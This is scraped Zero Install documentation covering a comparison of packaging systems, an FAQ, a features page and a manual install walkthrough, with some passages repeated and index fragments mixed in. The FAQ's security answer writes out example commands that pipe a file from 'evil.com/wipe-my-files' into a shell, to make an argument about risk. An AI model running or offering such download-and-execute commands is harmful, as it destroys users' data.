Obviously, these things tend to be a bit biased (both in terms of what features are chosen for comparison, and of what is considered to be a 'pass') but it should give the general idea. Feature Source tarball APT AppImage Chocolatey PortableApps.com Zero Install Users can install software Yes No Yes Some packages Yes Yes Supports multiple platforms Yes No (Linux only) No (Linux only) No (Windows only) No (Windows only) Yes Dependencies handled automatically No Yes Bundled Yes Bundled Yes Automatic upgrading No Yes Some packages No Yes Yes Libraries shared between programs Yes Yes No Partial No Yes Downloads shared between users No No user downloads No No No Yes Multiple versions coexist Yes No Yes No Yes Yes Uninstall Sometimes Yes Yes Some packages Yes Yes (cache) Digital signatures No Yes Yes Yes No Yes Conflict-free No No Yes No Yes Yes Decentralised Yes No Yes No No Yes Non-root install of system Yes No Yes No Yes Yes Can install systems software Yes Yes No Yes No No Supports sandboxing No No Yes No No Yes Usable when off-line Yes Yes Yes Yes Yes Yes Roam applications across machines No No Manual, app+config No Manual, app+config Automatic, app only Thousands of packages available Yes Yes No Yes No ~1500 Explanation of features \u00b6 Users can install software A normal user without special privileges can install software using this system (without unreasonable extra effort). Supports multiple platforms The same package format and command-line works across multiple operating systems, such as Linux and Windows. Dependencies handled automatically If a program requires some library to function, the system will locate, download and install the library too. Automatic upgrading The system can check for and install upgrades automatically or at the operator's request. User does not have to perform a full install operation manually on each package. Libraries shared between programs If two programs use the same library, the library is only downloaded and stored once. Upgrading a library will benefit all programs that use it. Downloads shared between users If two users install/use the same program, it is only downloaded once and stored once. See Sharing for how to set this up with Zero Install. Multiple versions coexist Two versions of a program or library can be installed at the same time, and the user can choose which one to run. Uninstall Programs can be cleanly removed from the system easily (reversing the effects of the install). Signatures Software comes with a digital signature, which is checked automatically by the system. Conflict-free If program A requires an old version of a library, and program B requires a new version, A and B can both be installed and used at the same time. The system will never refuse to install one program because some other program is installed. Decentralised A program packaged for this system can be installed easily, without having to be in some special centralised repository. Notes: Debian allows extra repositories to be added, but this is a manual step, requires root access, and is a considerable security risk. Non-root install of system The packaging system itself can be easily installed without administrator privileges, and the normal selection of software will be available. Can install systems software The packaging system can be used to install low-level systems software such as device drivers. Supports sandboxing If you have a way of running an application in a sandboxed environment (e.g., a Java virtual machine), then the installation system will let you install and run the program without forcing you to run any of the downloaded code outside of the sandbox. See the EBox sandboxing demo for an example of using 0install in this way. Usable when off-line Once a program has been installed, the program can be run again while disconnected. Roam applications between machines The packaging system makes it easy to roam applications across machines. This may or may not include the application's configuration files. This may or may not require manual effort by the user, such as setting up an external service like Dropbox. Thousands of packages available The system is widely adopted. By project \u00b6 AppImage \u00b6 AppImage is a system for packaging Linux applications into self-contained, single-file executables. Some differences between this and Zero Install: All dependencies that cannot reasonably be expected to come with all target systems (Linux distributions) in their default installation (\"base system\") are bundled into a single file and can therefore not be shared between apps. Automatic updating is implemented by an additional tool and only supported for AppImages that contain the required metadata. However, unlike Zero Install, it supports delta updates. Only supports Linux. For projects that do not provide official cross-distribution builds, AppImages are actually good candidates for being published via Zero Install. They can easily be referenced using the <file> retrieval method with executable='true' . Chocolatey \u00b6 Chocolatey is a package manager for Windows. Some differences between this and Zero Install: Relies on packages to implement reliable install and uninstall logic themselves. Cannot guarantee conflict-free or side-by-side installation. Uses a central, moderated package repository rather than decentralized files on the web. Most packages require administrative permissions for installation. Only supports Windows. Chocolatey could in future serve the role of the native package manager on Windows. See Distribution integration . PortableApps.com \u00b6 PortableApps.com is a collection of portable applications for Windows. Some differences between this and Zero Install: All dependencies are bundled and can therefore not be shared between apps. Only supports Windows. PortableApps write their config in the same directory as the installed applications. This makes them inherently incompatible with Zero Install, since it requires (and enforces) cached implementations to be read-only. Java Web Start \u00b6 Sun have developed a similar system to Zero Install, Java Web Start, although this only works for Java applications and has been deprecated. Microsoft have an equivalent called ClickOnce . Maven \u00b6 Maven is a build tool (like make or ant) for Java programs. Although not an installation system, it is similar to 0install in that each product has a pom.xml file with a list of dependencies. When building a product, Maven downloads the specified version of each dependency and stores it in a cache directory. Some differences between Maven 2.0 and 0install: The pom.xml files are not signed. An attacker can therefore cause modified POM files to be downloaded. There is no digest of the downloads in the POM file, so no security checks are performed to confirm that the download is OK, and downloads cannot be shared safely between users. Only Java is supported (everything is added to CLASSPATH , nowhere else). Dependencies are named using a simple two-layer system (e.g., axis/axis-jaxrpc). Therefore, a central repository is required to avoid naming conflicts. Note that you can use Zero Install in a maven-like way for compiling programs. See Easy GTK binary compatibility for an example of using Zero Install to compile a C program against an older version of a library's header files to ensure greater compatibility. Autopackage / Listaller \u00b6 Like Zero Install, Autopackage aims to let users install software and to make software distribution decentralised. The work done by the Autopackage developers to make packages relocatable is necessary for Zero Install too. Some differences between this and Zero Install: A script inside each package installs the files, making sandboxing difficult. It also makes conversion to other packaging formats troublesome . Security features such as GPG signatures have not been implemented. Given that packages are executable files, the design doesn't seem to allow this to be fixed. Downloads cannot be safely shared between users. No checking for updates or support for multiple versions. Being closer to traditional installation, it's easier to package existing applications with Autopackage. Note that it is quite possible to list autopackages in a Zero Install feed, as described in this post on the Autopackage mailing list . In this case, no scripts are run during installation (the package is treated as a normal archive), so not all packages will work, but many do. Autopackage is no longer maintained, but has merged with the Listaller project . The Listaller project has also taken over the tools for making relocatable applications , which may be useful for making 0install packages too. EDOS / Mancoosi \u00b6 The EDOS] ( Environment for the development and Distribution of Open Source software ) project was a research project looking at dependency management, QA, and efficient distribution of large software systems. Mancoosi is a follow-on project (\"Managing the Complexity of the Open Source Infrastructure\"). The group invited me to give a talk (March 2009); here are my notes from the event. Nix \u00b6 Nix is a purely functional package manager. Each version of a package has its own directory. As with Zero Install, \"upgrading\" creates a new directory for the new version, rather than modifying the existing one. Unlike Zero Install, however, whether a package is installed affects the behaviour of the system. For example, running \"firefox\" when Firefox isn't installed produces an error in Nix, whereas in Zero Install it will install Firefox first if missing and then continue. In other words, installation has side-effects in Nix. Additional feeds (e.g. for pre-built binaries) can be registered using nix-channel --add , which appears to work much like 0install add-feed , although each channel can contain binaries for multiple packages. The channel MANIFEST file doesn't appear to have a digital signature. Presumably this will be added at some point. Each version of a package has a digest (hash), which includes all build dependencies (e.g. the version of the compiler used), just as it does in Zero Install (for packages built using 0compile, at least). An important difference between the two is that the Nix hash is a hash of the inputs used to build the package, whereas the Zero Install hash is a hash of the resulting binary . Nix does this to support binaries that hard code their own paths, since the final hash needs to be known at compile time. For source (non-compiled) packages, the Nix hash is a hash of the contents, as with Zero Install. The Zero Install hash often happens to include the inputs, since it covers the build-environment.xml file which 0compile places in each binary package. Zero Install doesn't allow binaries to include hard-coded paths. Update: Nix is planning to use binary hashes everywhere in future (zeroing out self-references for the purposes of calculating the hashes). The same thing was proposed a few years ago for Zero Install (the relocation table ). It relies on the cache directory being at a fixed location, whereas people often have Zero Install set up to use their home directory, but it's basically a good idea. Another difference between Nix and Zero Install is that Nix treats configurations as packages. Changing your configuration is like \"upgrading\" your configuration package to a new version. Rolling back a change is like reverting to a previous version. Zero Install doesn't generally handle configuration settings, preferring to let the user use subversion (or similar) for that, but it's an interesting idea. Building a Nix package involves creating a \"Nix expression\" in a (custom) functional language. The expression fills the same role as a Zero Install source feed: it says where to download the source, what its digest is, what the build dependencies are, and how to build it. While Zero Install is mainly targeted at adding additional packages to an existing system, Nix aims to manage the whole system (although it installs cleanly alongside your existing package manager). Nix packages have short names (like perl ) not full URIs, and thus it appears to assume a centrally-controlled repository. In Nix, mutually untrusting users cannot share packages. The manual says A setuid installation should only by used if the users in the Nix group are mutually trusted, since any user in that group has the ability to change anything in the Nix store. Because the Nix hash is a hash of the inputs, it is not possible for the system to verify that a package is valid (it would have to download the sources and compile the program itself; Nix can share binaries in this case). Because Zero Install hashes are always hashes of the package contents, it does support sharing . OSTree \u00b6 OSTree describes itself as \"git for operating system binaries\". It shares many goals with 0install (multiple versions of libraries can coexist on one system and you can roll-back easily). While 0install focuses on applications and their libraries, OSTree focuses on the OS itself. However, there is quite a bit of overlap. For example, OSTree considers GTK+ to be an OS library, while 0install might consider it to be an application dependency (which can optionally, of course, be provided by the OS). Glick 2 \u00b6 Glick 2 has essentially the same goals as 0install, but includes all dependencies in a single bundle rather than linking libraries dynamically at run-time (for example, when a library is updated, every program using that library must be updated individually). It has support for non-relocatable applications, using some Linux-specific tricks. It might be worth using these in 0install to implement the <mount-point> binding, but few applications are non-relocatable these days. DOAPDescription of a Project \u00b6 DOAP is a project to create an XML/RDF vocabulary to describe open source projects. We should investigate whether any of these elements would be useful in Zero Install feed files. Environment modules \u00b6 The Environment Modules package provides for the dynamic modification of a user's environment via modulefiles. Each modulefile contains the information needed to configure the shell for an application. Typically modulefiles instruct the module command to alter or set shell environment variables such as PATH , MANPATH , etc. To be able to load (\"install\") software, it must first be installed under the $MODULESHOME directory which is in /usr/local/Modules or a shared network filesystem. It is also possible to install it in ~/.local without root permissions, but then the modules can't be shared (due to different $HOME ). The module(1) command doesn't provide a method to share or distribute the applications, so modulefiles typically take advantage of transparent remote network filesystem access such as NFS and AFS. 0install can also be used in this way, with local feeds taking the place of the modulefiles and giving the path of the software on the network file-system rather than a URL from which it can be downloaded. If you believe that any of the information above is inaccurate or out-of-date, please write to mailing list to let us know.

Zero Install is a decentralised cross-distribution software installation system. Features include full support for shared libraries (with a SAT solver for dependency resolution), sharing between users, and integration with native platform package managers. It supports both binary and source packages, and works on Linux, OS X, Unix and Windows systems. It is fully Open Source. How many Zero Install packages are there? The public mirror site provides a list of feeds we know about. There are currently more than 2000, although the quality varies. What are \"decentralised\" installation systems, and why are they important? See my essay on OSNews or, if you're in a hurry, just read the summary . Where does it install things to? By default, everything goes under ~/.cache/0install.net/ . If you enable system-wide sharing , then things go under /var/cache/0install.net/ instead. See File locations . If you want to know where a particular program is, you can use 0install show , e.g. $ 0install add rox-edit http://rox.sourceforge.net/2005/interfaces/Edit $ 0install show rox-edit - URI: http://rox.sourceforge.net/2005/interfaces/Edit Version: 2 .2 Path: /home/me/.cache/0install.net/implementations/sha256 = ba3b495324192bb6c3fc1a2d9af3db2ced997fc8ce3177f08c926bebafcf16b9 - URI: http://rox.sourceforge.net/2005/interfaces/ROX-Lib Version: 2 .0.6 Path: /home/me/.cache/0install.net/implementations/sha256 = ccefa7b1873926de15430341b912466929fbff8116b6d0ad67c4df6d0c06243e - URI: http://repo.roscidus.com/python/python Version: 2 .7.8-3 Path: ( package:deb:python2.7:2.7.8-3:x86_64 ) That said, you shouldn't ever need to know where things are cached. If you're relying on this for some reason, you're probably doing it wrong ;-) Isn't is really hard to run applications if you always have to type URIs for them? Yes. As with the web, that works but it's not the intended way to do it. Like the web, you have links to the URIs, and you use the links normally. For example, you can run 0install add to let you run programs quickly from the shell, or AddApp to create graphical launchers, for example. You could put a launcher on the desktop background, set a keyboard shortcut, or add it to your Start menu. A 'distribution' could be nothing more than a web page listing links to high quality software for a particular audience. How do you do integration (e.g., making a Start menu show all installed software)? Since there is no concept of software being 'installed' or 'not-installed', this is not required. The menu (or other launching device) simply shows applications that the user may want to run. They will be fetched on demand. The menu doesn't show installed software; rather, the 'installed' software is what the user has put on the menu. This can be done e.g. using the 0desktop command on Linux or the desktop integration feature on Windows. The new menu entry is independent of the program data though; removing the program from the cache doesn't remove the menu item (clicking on it would simply offer to download the program again). Isn't it wasteful for every program to bundle all its dependencies? Yes, but Zero Install doesn't do that. Everything is dynamically linked, just as in a traditional Linux system: you can publish a program on your web-site that links against a library on another web-site. When updates are available for a library, they are used by all programs using that library (except for programs which are incompatible with the new library version, which will continue using the older version, without preventing other programs from upgrading). However, see Export for methods to create such all-in-one bundles for distribution on CD. Why was it called the \"injector\"? The name came from Dependency Injection - see \"The scarily-named Injector\" for details. Now we just call it \"0install\". Wouldn't it be cool if you could install software just by clicking in a web page? It's a bit of a security risk. If you set up your browser to do this, then the author of any random web-site can try to trick you into clicking on some harmless-looking link. They may even be able to trigger the process without any action from you at all. Zero Install's confirmation dialogs should prevent it from actually getting installed, but: Even with confirmation boxes, web pages can still annoy users by opening thousands of them. You'd need some kind of popup-blocker type technology to stop that. The malicious web page gets to send arbitrary data of their choice to Zero Install. For example, they might try to exploit a buffer-overflow in GnuPG by sending malformed data. Zero Install should reject it, but it's safer if we don't even allow the process to start. If you do this, then your browser needs permission to run arbitrary programs, add items to your Start menu, etc. Given that the browser is one of the most at-risk components on your system, this doesn't sound like a good plan (although browsers are often configured this way at present). Therefore, we require you to drag the link to the installer to start the process. That way, if you weren't intending to install anything, then the process doesn't even start. As an added bonus, this lets you specify where on your desktop you want the launcher created. That said, if you want this anyway then there's an experimental Firefox Extension to do this. Will Zero Install conflict with my existing package manager? No. Zero Install only writes to its own cache directory. It is completely independent of your existing packaging system. If you install the same program using both systems, you'll get two copies on your system, but they will be kept separate. You can use this to test a newer version of a program without messing up your existing installation. Zero Install can use distribution packages to satisfy some dependencies (rather than downloading a new copy itself). This doesn't affect programs installed using the native packaging system at all. See Distribution Integration for details. Note While installation won't cause problems, actually running a program might change something (for example, a newer version may automatically upgrade a configuration file to a format that the older version can't read). This is essentially the same situation as when you downgrade a package to a previous version using your normal package manager. How do I know you won't start charging for this service? I'm not providing a service. You distribute software by hosting some files on your own web server. The only centralised URLs are the default mirror site and the default GPG key information server, both of which are optional. The core software is all LGPL or GPL. What if something gets automatically removed from the cache while I'm up a mountain with my laptop? Currently, nothing is ever automatically removed from the cache. Users can choose the purging scheme that suits them. For users with broadband, that might mean removing anything that hasn't been accessed for a year. For users with dial-up and 80Gb disks, that probably means never ever removing anything. You can run 0install store manage to view the cache and remove versions of programs you don't need anymore: You can also just delete things from the ~/.cache/0install.net directory directly, but it's easier using the GUI. What happens if there are two programs which may not be run simultaneously for some reason? Running and installing are separate. In Debian, for example, installing some software (eg, exim) may also cause it to run, but in zero install there is no install step, only the running step. So, you can 'install' any number of conflicting packages, but you can still only run one mail system at once. Can upstream authors really be trusted to provide decent quality software? Traditionally, a lot of the QA work that goes on in open source software is done by distributions (such as Debian). They take the `upstream' code from the software authors, and then provide a packaged version to their users. There are then two classes of bugs to worry about: upstream bugs and packaging bugs. Since it's not usually clear to users which bugs are in which category, they tend to report all bugs to the packagers, who often then fix even upstream bugs in their own packages. The effect of this is that distribution-provided packages are often more reliable than upstream ones (since upstream don't get to hear about many of the bugs), and different distributions have fixed different bugs, with no coordination between them. With Zero Install, bugs get fixed upstream. So, the 'Debian developer' who currently fixes Gimp bugs would still do the same job, but as a 'Gimp developer' instead. Thus, the fixes would benefit everyone, not just Debian users. Of course, the other reason why packages may be different to the upstream versions is because upstream is slow to respond, uninterested, or known to be careless about quality. In this case, a Zero Install packager can provide a fixed version from their own site and get other people to link to that. The advantage here is that, again, everyone benefits, not just users of one distribution. Does this replace /etc , /var , /tmp , etc.? No. Zero Install is read-only, so you couldn't store configuration, data or temporary files in it, even if you wanted to. It replaces /usr and /opt . It's sensible to keep the other things separate, because they need to be treated differently: /etc Contains system configuration. Should be backed up, and probably kept under version control too. May be mounted read-only most of the time. /home User data. Must be writable, and often changes. Should be backed up regularly. /var Changes quickly (contains print and mail queues, logs, etc). Must be writable. Doesn't need to be backed up, but data should persist over reboots. Zero Install cache is stored here; if lost it will just prompt you to download the programs again when you run them. /tmp Changes quickly and must be writable, but need not persist over reboots (can use tmpfs rather than a physical disk). What was the inspiration for Zero Install? Several things. CODA and wwwoffle for showing that caching network filesystems can still work when off-line. The W3C for using URIs for namespaces. Not Java Web Start , Konvalo, D. J. Bernstein's slashpackage or The Open Software Description Format (OSD) though, because I had never heard of them when I started the project. What's the relationship between the 0install and 0launch commands? 0launch is older. It was originally intended to be used just for running things, but we ended up adding a load of other options to it (e.g. 0launch --import ) and it got a bit messy. 0install provides a cleaner, newer interface using sub-commands. 0launch URI is equivalent to 0install run URI . In general, using 0launch as anything other than a short form of 0install run is deprecated and you should use 0install instead. Network questions \u00b6 Isn't fetching stuff over the web really slow? You have to get stuff over the web anyway the first time. The system caches everything, and you can run the software in future without needing a network connection. Doesn't it require a fast Internet connection? No more than downloading programs from the Internet normally. However, it can still save you some time, since it might only download the documentation for a package when you click on Help, for example. With traditional systems, all the extras have to get installed with the main program because users can't install anything themselves later if they find they need it. What about people without Internet connections? You can use 0export to create a setup.sh self-extracting installation script for distribution on CDs. What about when resources move? Everything you've already accessed at least once will continue to work. Users trying software for the first time will find that it doesn't work due to broken links. This is not new, either. The download instructions for ROX-Filer tell users that they need to get GTK from www.gtk.org and libxml from www.xmlsoft.org. If those sites change their names, the download instructions will be broken. It really doesn't make any difference. As with the regular web, people can leave redirections to the new site. Also, if a feed can't be fetched from its main site, Zero Install will automatically try using a mirror service. Mirror services continue hosting feeds that are no longer available from their original sites. The 0install import command lets you import the feed from the new location, and 0install store add allows adding any archive to the cache (provided its message digest matches). Because Zero Install simply unpacks an archive when installing a package, anyone with that program cached can re-export it (e.g. using 0export ). Because Zero Install digests are over the package archive's contents (not the archive itself), the original GPG signature is still valid (and is also exported by 0export). The digest can also be checked against the one from the mirror server. Security questions \u00b6 How secure is this? About as secure as any system which ultimately involves running software written by people you don't know who live in far away countries. However, since the downloading is automatic, there are more chances for automatic checking (eg, verifying GPG signatures, etc): To be more precise, it has all the advantages of application directories (no install step, so no chance for anything to run as root). In addition, if two users try to run the same application, they both automatically get the same cached copy, whereas without this each would have to install a separate copy to their home directory, or one user has to trust the other user not to have modified his copy, and use that. See the security issues document for more information. Doesn't Zero Install make it easier to send users malicious software? Not really. True, you could email a user, telling them to run: $ 0install run http://evil.com/wipe-my-files But on the other hand, you could also send them an email telling them to type: $ lynx -source http://evil.com/wipe-my-files | sh - Both can do exactly the same amount of damage, but the second works on any system. If a user is prepared to run unknown software, they're going to do it with or without Zero Install. Zero Install helps with large, complicated programs with lots of dependencies, whereas your typical malicious program is only a few lines long, and doesn't benefit from it. Sometimes, bugs are found (and fixed) in the Linux kernel that allow any user to become root. For example, one was used to compromise some of Debian's servers. Couldn't a user access some software through Zero Install that took advantage of this bug to break an un-patched machine? Well, yes. But, as with the question above, they could do it just as easily without Zero Install (using wget, or just by typing the program in themselves). If your kernel is insecure, you have a problem with or without Zero Install. Developers \u00b6 How do I provide software using Zero Install? The main requirement is that the program doesn't use hard-coded paths. It should get resources from its own package relative to its own location (e.g. a shell script would use $(dirname $0)/mydata rather than /usr/share/myprog/mydata ). Resources in other packages should be found using environment variables ( $GAME_DATA/level1 rather than /usr/share/gamedata/level1 ). Many programs do this already. Once you have suitable binary, upload an archive of it onto your web-site in the normal manner. The most widely understood formats are .tar.gz and .tar.bz2 , but Zero Install can also extract from .zip files, and .rpm , .deb and .autopackage packages if the appropriate extraction program is available ( unzip , rpm2cpio , etc). Often, you don't need to do anything special for Zero Install and can just use your existing binary release. Finally, you need to write a short XML file describing your program, the versions of it that are available, how to get them, and what libraries they require. See the Packaging Guide for details. How do I install a library? You don't install libraries directly; instead, each program which depends on the library must specify this dependency in its XML feed. In this way, every program sees a version of the library with which it is compatible. The only programs which will \"see\" a 0install library are those programs which specify a dependency on it. Note If the program does specify the dependency, and you just want to make it use a particular version of the library, see the next question... How can I run my own version of something, instead of downloading a released version? Let's say you want to run a Git (developer) version of Edit. Start by cloning Edit's Git repository, as normal: $ git clone git://repo.or.cz/rox-edit.git Edit Aside: If you don't have Git, just use Zero Install to get it: $ 0install add git http://0install.net/2008/3rd-party/git.xml Now, if you try to run it directly, it will probably complain that it can't find ROX-Lib (a library it needs): $ cd Edit $ ./AppRun *** This program needs ROX-Lib2 ( version 1 .19.14 ) to run. The required libraries are listed in the Edit.xml file, and you can run that using 0install run : $ 0install run Edit.xml [ edit runs ] Of course, you could do 0install add edit-git Edit.xml to make a command that runs this version easily. How can I register my own version under the original's URI? The answer to the last question showed how to run a local version of a program directly, using 0install to fetch the libraries it needed. However, if you (or some other program) run Edit using the normal URI ( http://rox.sourceforge.net/2005/interfaces/Edit ), your version won't show up. To add it, use 0install add-feed : $ cd Edit $ 0install add-feed Edit.xml Feed 'Edit.xml' : 1 ) Add as feed for 'http://rox.sourceforge.net/2005/interfaces/Edit' Enter a number, or CTRL-C to cancel [ 1 ] : Feed list for interface 'http://rox.sourceforge.net/2005/interfaces/Edit' is now: - /home/talex/rox/Edit/Edit.xml $ 0install select -g http://rox.sourceforge.net/2005/interfaces/Edit When the GUI opens, you should see your local feed listed: The new version will appear in the list of available versions, and will be selected if it's the newest one (which a fresh subversion checkout should be - the version normally ends in -post to indicate that it is not a released version): This is particularly useful for libraries, since they are always used by other programs rather than run directly. Is Linux binary compatibility good enough to share binaries between distributions? There are some problems in this area generally (not just with Zero Install). However, we have binaries for ROX-Filer and many other programs that work on all distributions, so it's certainly possible. Zero Install can help you create more compatible binaries by compiling against older versions of header files; see Easy GTK binary compatibility for an example.","title":"FAQ"},{"location":"about/faq/#frequently-asked-questions","text":"","title":"Frequently Asked Questions"},{"location":"about/faq/#general-questions","text":"What is it?

Couldn't a user access some software through Zero Install that took advantage of this bug to break an un-patched machine? Well, yes. But, as with the question above, they could do it just as easily without Zero Install (using wget, or just by typing the program in themselves). If your kernel is insecure, you have a problem with or without Zero Install.","title":"Security questions"},{"location":"about/faq/#developers","text":"How do I provide software using Zero Install? The main requirement is that the program doesn't use hard-coded paths. It should get resources from its own package relative to its own location (e.g. a shell script would use $(dirname $0)/mydata rather than /usr/share/myprog/mydata ). Resources in other packages should be found using environment variables ( $GAME_DATA/level1 rather than /usr/share/gamedata/level1 ). Many programs do this already. Once you have suitable binary, upload an archive of it onto your web-site in the normal manner. The most widely understood formats are .tar.gz and .tar.bz2 , but Zero Install can also extract from .zip files, and .rpm , .deb and .autopackage packages if the appropriate extraction program is available ( unzip , rpm2cpio , etc). Often, you don't need to do anything special for Zero Install and can just use your existing binary release. Finally, you need to write a short XML file describing your program, the versions of it that are available, how to get them, and what libraries they require. See the Packaging Guide for details. How do I install a library? You don't install libraries directly; instead, each program which depends on the library must specify this dependency in its XML feed. In this way, every program sees a version of the library with which it is compatible. The only programs which will \"see\" a 0install library are those programs which specify a dependency on it. Note If the program does specify the dependency, and you just want to make it use a particular version of the library, see the next question... How can I run my own version of something, instead of downloading a released version? Let's say you want to run a Git (developer) version of Edit. Start by cloning Edit's Git repository, as normal: $ git clone git://repo.or.cz/rox-edit.git Edit Aside: If you don't have Git, just use Zero Install to get it: $ 0install add git http://0install.net/2008/3rd-party/git.xml Now, if you try to run it directly, it will probably complain that it can't find ROX-Lib (a library it needs): $ cd Edit $ ./AppRun *** This program needs ROX-Lib2 ( version 1 .19.14 ) to run. The required libraries are listed in the Edit.xml file, and you can run that using 0install run : $ 0install run Edit.xml [ edit runs ] Of course, you could do 0install add edit-git Edit.xml to make a command that runs this version easily. How can I register my own version under the original's URI? The answer to the last question showed how to run a local version of a program directly, using 0install to fetch the libraries it needed. However, if you (or some other program) run Edit using the normal URI ( http://rox.sourceforge.net/2005/interfaces/Edit ), your version won't show up. To add it, use 0install add-feed : $ cd Edit $ 0install add-feed Edit.xml Feed 'Edit.xml' : 1 ) Add as feed for 'http://rox.sourceforge.net/2005/interfaces/Edit' Enter a number, or CTRL-C to cancel [ 1 ] : Feed list for interface 'http://rox.sourceforge.net/2005/interfaces/Edit' is now: - /home/talex/rox/Edit/Edit.xml $ 0install select -g http://rox.sourceforge.net/2005/interfaces/Edit When the GUI opens, you should see your local feed listed: The new version will appear in the list of available versions, and will be selected if it's the newest one (which a fresh subversion checkout should be - the version normally ends in -post to indicate that it is not a released version): This is particularly useful for libraries, since they are always used by other programs rather than run directly. Is Linux binary compatibility good enough to share binaries between distributions? There are some problems in this area generally (not just with Zero Install). However, we have binaries for ROX-Filer and many other programs that work on all distributions, so it's certainly possible. Zero Install can help you create more compatible binaries by compiling against older versions of header files; see Easy GTK binary compatibility for an example.","title":"Developers"},{"location":"about/features/","text":"Features \u00b6 Decentralised; anyone can distribute software The traditional Linux distribution system, using centralised repositories, creates an interesting chicken-and-egg situation: distributions won't package software until it becomes popular, but software won't become popular until it's easy to install. You don't need to be blessed by a distribution (or anyone else) to be part of 0install; all you need is a web page. It's easier too: you can make a single archive that works on all platforms (for platform-independent applications such as Python or Java programs), or have 0install download the correct archive automatically (for platform-specific binaries). See the \" Decentralised Installation Systems \" essay on OSNews for a more complete introduction to the subject. See the Packaging Guide for information on distributing software using 0install. Security is central Security is sometimes seen as the enemy of usability, but we see it as the foundation of a usable system. Good security doesn't just mean not having your data destroyed by viruses - it means freedom to experiment with new software. The problems with a centrally-controlled \"app store\" as the only means to get software are clear to everyone: applications that compete with the store owner's interests are banned. Innovation and competition suffer. But the same effect can be achieved without overt restrictions if getting software from outside the distribution repository is simply too risky for users to consider. See the security page for more information about 0install's security features. You control your own computer When you install a package with a traditional installer, you have no way of knowing what it will do. Will it add itself to a menu somewhere? Start a service whenever you turn on the computer? Stop another program from working? 0install merely caches programs, each version of each package in its own directory. Changes to the environment, such as adding a menu entry, only happen in response to a deliberate action on your part. Conflict free If two programs want the same version of a library, they'll share it. Otherwise, they'll use separate copies. You're free to try the very latest development version of a program (along with all the bleeding-edge libraries it needs) without destabilising the rest of your system. And you can always revert back to an older version... or run old and new versions of the same program side-by-side! Shared binaries/cache 0install supports sharing of binaries (the implementation cache) between users and between virtual machines . If one user installs a 200 Mb application, another user can run it without downloading it again. Most packaging systems solve this problem by only allowing root to install software. The systems which don't have this limitation typically end up downloading and storing multiple copies of a program; one for each user. 0install shares downloads (safely) between users. With 0install, each user downloads a small feed file which gives the cryptographic digest of the full package. The digest can be used to check that a package already on the computer (downloaded by another user) hasn't been tampered with. Most simply, each user can make a copy of the original download this way (which shares the download but not the disk space). With a special helper, even the disk copies can be safely shared. Cross-Platform and Cross-Distribution A single 0install package can be used across multiple Linux distributions, OS X, Unix and Windows systems (given that the packaged application itself is written to be cross-platform as well). Automatic updates When you run a program and it has been a month since the last check, 0install will quietly check for updates in the background. If any are available, you will be notified. The frequency of these checks is configurable, and you can choose not to use the latest version if you prefer. Binary and source packages 0install supports both compiling applications from source and downloading binaries. Native package manager integration If you have already installed a package using your distribution's installer then 0install can use that instead of downloading a second copy. It can also use use PackageKit to install system packages using the distribution's package manager, if no 0install package is available. See the distro integration page for more information. Run without granting root privileges When installing a package, most installation systems execute pre- and post-install scripts inside the package as root, giving the package full access to your machine. Even if they didn't, the fact that the package can unpack files to directories such as /usr/bin or /usr/lib effectively gives them root access anyway. By contrast, when 0install installs (caches) a package, it does not run any code from the package and it does not write to any of the traditional software directories like /usr/bin or /usr/lib . Instead it simply puts each unpacked archive into its own directory. Run without being root Since installing software with 0install does not allow it to affect the system as a whole, there is no need to restrict it to users with root privileges. Therefore, there is no need to give users root privileges just so that they can install software.","title":"Features"},{"location":"about/features/#features","text":"Decentralised; anyone can distribute software The traditional Linux distribution system, using centralised repositories, creates an interesting chicken-and-egg situation: distributions won't package software until it becomes popular, but software won't become popular until it's easy to install.

Pick a version \u00b6 Edit's feed lists several versions. I'll pick the latest one: version 2.0. If you find that version to be buggy, you might make a note of that and try a different version. Some may have been released recently and be marked as \"testing\". Whether you skip such versions is up to you. The relevant section of the XML file is this bit: <group main= \"Edit/AppRun\" > <requires interface= \"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\" > <environment insert= \"ROX-Lib2/python\" name= \"PYTHONPATH\" /> </requires> ... <implementation id= \"sha1=329e6c0191f65ef2996b49837d04c4cfe6934758\" released= \"2005-09-21\" stability= \"stable\" version= \"2.0\" > <archive extract= \"edit-2.0\" href= \"http://kent.dl.sourceforge.net/sourceforge/rox/edit-2.0.tgz\" size= \"61195\" /> </implementation> </group> This tells us that we can get Edit version 2.0 by downloading edit-2.0.tgz and extracting the edit-2.0 directory inside it: $ wget http://kent.dl.sourceforge.net/sourceforge/rox/edit-2.0.tgz $ tar xzf edit-2.0.tgz edit-2.0 $ ls edit-2.0 Edit Security note \u00b6 How do we know the archive hasn't been tampered with? The author of the XML feed calculated a cryptographic digest of the archive's contents and stored it in the feed: <implementation id= \"sha1=329e6c0191f65ef2996b49837d04c4cfe6934758\" released= \"2005-09-21\" stability= \"stable\" version= \"2.0\" > <archive extract= \"edit-2.0\" href= \"http://kent.dl.sourceforge.net/sourceforge/rox/edit-2.0.tgz\" size= \"61195\" /> </implementation> We can calculate the value ourselves from the directory and compare (we already verified the signature on the feed, so we know that one's OK). Calculating the value is a little tricky; you have to create a manifest file listing all the files and directories in the archive, along with their digests too, by following these instructions . We'll cheat, by using 0install to generate it for us: $ 0install digest edit-2.0 --algorithm = sha1 --manifest --digest D 1127294333 /Edit F 0cfc0b0c42b4f4c077f005f31ea1801a8e43bde0 1053080001 3409 .DirIcon ... X d6f4507353737e35ce7af5ab10a589e5a644bec5 1106998691 1472 testreplace.py sha1 = 329e6c0191f65ef2996b49837d04c4cfe6934758 This says we have a directory called Edit containing a file called .DirIcon , and so on. The last line isn't part of the manifest; it's the digest of the manifest itself. It is this value that must match the id in the feed. It's useful to save the manifest output (minus the last line) in case we want to do an audit later: $ 0install digest edit-2.0 --algorithm = sha1 --manifest > edit-2.0/.manifest This file will have the digest we require: $ sha1sum edit-2.0/.manifest 329e6c0191f65ef2996b49837d04c4cfe6934758 edit-2.0/.manifest Run it! \u00b6 We've downloaded and unpacked Edit. How do we run it? We don't have to guess; the answer is in the XML feed file: <group main= \"Edit/AppRun\" > There was no main attribute on the implementation element, so we look in the containing group and find one. This tells us that we can run the program by executing the file Edit/AppRun inside the unpacked directory. $ ./edit-2.0/Edit/AppRun *** This program needs ROX-Lib2 ( version 1 .19.14 ) to run. If the program you picked didn't have any dependencies then it should now run (lucky you!). But, like many programs, Edit needs libraries to work. Resolving dependencies \u00b6 Our program needs some libraries before it will run. Which ones? Again, the feed XML tells us: <group main= \"Edit/AppRun\" > <requires interface= \"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\" > <environment insert= \"ROX-Lib2/python\" name= 